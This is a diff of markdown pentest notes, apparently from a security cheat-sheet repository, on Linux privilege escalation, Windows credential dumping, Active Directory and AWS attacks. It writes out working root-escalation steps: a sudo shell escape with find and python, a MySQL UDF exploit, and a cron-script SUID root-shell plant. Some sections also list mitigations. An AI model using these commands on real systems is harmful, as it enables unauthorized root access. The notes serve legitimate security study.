@@ -190,33 +190,21 @@ For a kernel exploit attack to succeed, four conditions are required:
 * The ability to execute the exploit on the target
 
 _Example_: Dirty Cow Exploit replaces “root” with “rash” by editing the /etc/passwd file
-
-
-
 * [DirtyCow variants on GitHub](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
 
 _Example_: [Dirty Pipe Exploit](https://arstechnica.com/information-technology/2022/03/linux-has-been-bitten-by-its-most-high-severity-vulnerability-in-years/) [[Link to code](https://haxx.in/files/dirtypipez.c) that hijacks SUID binary for root access]
 
 Kernel exploits can be searched through Kali using “searchspoilt”
-
-
-
 * $ searchspoilt Linux Kernel 2.6.24 (← Kernel number found by running uname -a)
 
 **<span style="text-decoration:underline;">Root-Service Exploits</span>**
-
 Exploits that operate through services running as root. 
-
 Check open and active ports by running netstat -antup [[How to use netstat]](https://www.howtogeek.com/513003/how-to-use-netstat-on-linux/)
 
 _Examples_: [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue), [SambaCry](https://thehackernews.com/2017/05/samba-rce-exploit.html) 
-
 _Example_: [PwnKit](https://arstechnica.com/information-technology/2022/01/a-bug-lurking-for-12-years-gives-attackers-root-on-every-major-linux-distro/) runs on the back of the PolKit daemon for system-policy management
 
 [MySQL UDF Dynamic Library Exploit](https://www.exploit-db.com/exploits/1518/)
-
-
-
 * Find services running as root: ps -aux | grep root
 * From the mysql shell:
     * create function do_system returns integer so name ‘raptor_udf2.so’
@@ -235,38 +223,27 @@ _Example_: [PwnKit](https://arstechnica.com/information-technology/2022/01/a-bug
 * Escape to the shell as root: !sh
 
 Avoid this by:
-
 * Never set SUID on any program that allows escape to shell
 * Never set SUID on any editor/comiler/interpreter
 
 **<span style="text-decoration:underline;">SUDO Exploits</span>**
-
 Misconfigured SUDO rights can allow root access through programs that edit code or allow escape to the shell
 
 <span style="text-decoration:underline;">Cmd Execute “Escape to Shell” Exploitls </span>
-
-
-
 * Determine commands that run as SUDO: sudo -l
 * Find command’s execute parameter: sudo find /home -exec sh -i \;
 
 <span style="text-decoration:underline;">Python “Shell Spawn” Exploit</span>
-
-
-
 * Spawn a python shell: sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
 
 Avoid this by:
-
 * Never give SUDO to any program that allows escape to shell
 * Never give SUDO to vi, more, less, nmap, perl, ruby, python, gdb and others
 
 **<span style="text-decoration:underline;">cron job Exploits</span>**
-
 cron jobs usually run with root privilege to poorly configured cron files can allow arbitrary code to be executed
 
 <span style="text-decoration:underline;">World-writable cron script Exploit</span>
-
 * Print world-writeable files find / -perm -2 -type f 2>/dev/null
 * Confirm cron file is writeable ls -la /usr/local/sbin/cron-logrotate.sh
 * Write C file in /tmp cd /tmp then vi rootme.c
@@ -277,13 +254,11 @@ echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;” >/usr/local/sbin/
 * Run file to spawn root shell ./rootme
 
 Avoid this by:
-
 * Scripts & binaries in cron jobs should not be writable
 * cron file should not be writable except for root
 * cron.d directory should not be writable except for root
 
 <span style="text-decoration:underline;">‘.’ User Path Exploits</span>
-
 ‘.’ allows the user to execute binaries/script from their current directory. If ‘.’ is removed, it allows attackers to rename a file as a command (eg. ls) that will execute as soon as someone (ideally with root privileges) uses it in the file’s directory.
 
 ls “PATH Variable” Exploit
@@ -296,26 +271,21 @@ ls “PATH Variable” Exploit
 * List available commands `compgen -c`
 * start bash without source'ing either ~/.bashrc or ~/.bash_profile 
 * since such a shell wouldn't be a full login shell / have no tty attached, force ssh to attach a tty:
-
 ## Windows Specific
 
 * [Windows Security Log Events](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)
 * [Teamviewer Flaw for cracking user passwords](https://threatpost.com/teamviewer-fhigh-severity-flaw-windows-app/158204/)
 * [Remotely dumping Windows credentials](https://meriemlarouim.medium.com/credentials-in-windows-and-how-to-dump-them-remotely-b5c315bb76f4)
 * [Using Impacket to Dump Windows Secrets](https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b)
-
 ### M365 & Active Directory
 * [Understanding Active Directory Attack Paths](https://thehackernews.com/2023/08/understanding-active-directory-attack.html)
 * [Using Bloodhound CE to attack Active Directory](https://www.8com.de/cyber-security-blog/bloodhound-ce-and-automating-parts-of-ad-pentests)
 * [Active directory pentesting](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide) - Cheatsheet and beginner guide
 * [ScubaGear](https://github.com/cisagov/ScubaGear) - M365 security assessment tool, CISA-developed, run in Powershell
 * [UntitledGooseTool](https://github.com/cisagov/untitledgoosetool) - AzureAD/M365 security assessment tool, Python-based, CISA-developed
-
 # Cloud Techniques
 ## AWS 
 * [HTB - AWS Penetration Testing Guide](https://www.hackthebox.com/blog/aws-pentesting-guide)
 * [Infosec Writeups - Hacking AWS Cognito Misconfiguration](https://infosecwriteups.com/hacking-aws-cognito-misconfiguration-to-zero-click-account-takeover-36a209a0bd8a)
 * [Not so secure - Hacking AWS Cognito Misconfigurations](https://notsosecure.com/hacking-aws-cognito-misconfigurations)
 * [AdeliaRisk - 7 Ways I'd Hack You on AWS](https://adeliarisk.com/secure-cloud-computing-7-ways-id-hack-aws/)
-
-
